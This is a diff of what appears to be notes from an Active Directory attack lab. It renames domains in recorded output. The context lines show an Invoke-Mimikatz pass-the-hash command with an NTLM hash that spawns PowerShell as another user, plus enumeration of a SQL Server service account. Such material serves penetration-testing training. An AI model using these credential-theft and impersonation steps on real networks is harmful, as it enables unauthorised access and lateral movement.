@@ -294,7 +294,7 @@ PS C:\bilal\AD>  Invoke-Mimikatz -Command "sekurlsa::pth /user:uatadmin /domain:
 
 mimikatz(powershell) # sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe
 user    : uatadmin
-domain  : garrison.castle.local
+domain  : nebula.cosmos.local
 program : powershell.exe
 impers. : no
 NTLM    : 271b74be505cd48cef768d0d973e59e7
@@ -377,13 +377,13 @@ ComputerName : devsrv.nebula.cosmos.local
 
 Instance : DEVSRV
 
-DomainName : GARRISON
+DomainName : nebula
 
 ServiceProcessID : 2576
 
 ServiceName : MSSQLSERVER
 
-ServiceAccount : GARRISON\devsqladmin
+ServiceAccount : nebula\devsqladmin
 
 AuthenticationMode : Windows and SQL Server Authentication
 
